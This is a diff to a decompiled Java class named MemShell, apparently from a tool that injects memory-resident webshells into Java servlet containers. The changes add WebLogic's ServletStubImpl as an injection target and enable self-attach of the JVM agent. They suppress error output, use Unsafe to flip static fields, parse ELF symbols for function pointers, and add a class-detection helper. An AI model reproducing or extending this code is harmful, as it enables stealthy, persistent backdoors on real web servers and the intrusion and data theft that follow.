@@ -74,7 +74,7 @@ public class MemShell extends ClassLoader {
             System.setProperty("jdk.attach.allowAttachSelf", "true");
             this.fillContext(obj);
             if (action.equals("get")) {
-               String[] targetClassArr = new String[]{"/jakarta/servlet/http/HttpServlet.class", "/javax/servlet/http/HttpServlet.class"};
+               String[] targetClassArr = new String[]{"/weblogic/servlet/internal/ServletStubImpl.class", "/jakarta/servlet/http/HttpServlet.class", "/javax/servlet/http/HttpServlet.class"};
                String[] var4 = targetClassArr;
                int var5 = targetClassArr.length;
 
@@ -423,7 +423,8 @@ public class MemShell extends ClassLoader {
       FileInputStream fis = new FileInputStream(new File(filePath));
       byte[] buffer = new byte[10240000];
 
-      for(int length = 0; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
+      int length;
+      for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
       }
 
       fis.close();
@@ -524,7 +525,6 @@ public class MemShell extends ClassLoader {
          long fieldAddress = unsafe.staticFieldOffset(field);
          unsafe.putBoolean(cls, fieldAddress, true);
       } catch (Throwable var7) {
-         var7.printStackTrace();
       }
 
    }
@@ -621,7 +621,8 @@ public class MemShell extends ClassLoader {
             fin.seek(symstr_shdr_sh_offset + (long)st_name);
             String name = "";
 
-            for(byte ch = 0; (ch = fin.readByte()) != 0; name = name + (char)ch) {
+            byte ch;
+            for(boolean var62 = false; (ch = fin.readByte()) != 0; name = name + (char)ch) {
             }
 
             if (sym.equals(name)) {
@@ -633,5 +634,14 @@ public class MemShell extends ClassLoader {
 
       fin.close();
       return func_ptr;
+   }
+
+   private Boolean detect(String className) {
+      try {
+         ClassLoader.getSystemClassLoader().loadClass(className);
+         return Boolean.TRUE;
+      } catch (ClassNotFoundException var3) {
+         return this.getClass().getResource(className) != null ? Boolean.TRUE : Boolean.FALSE;
+      }
    }
 }
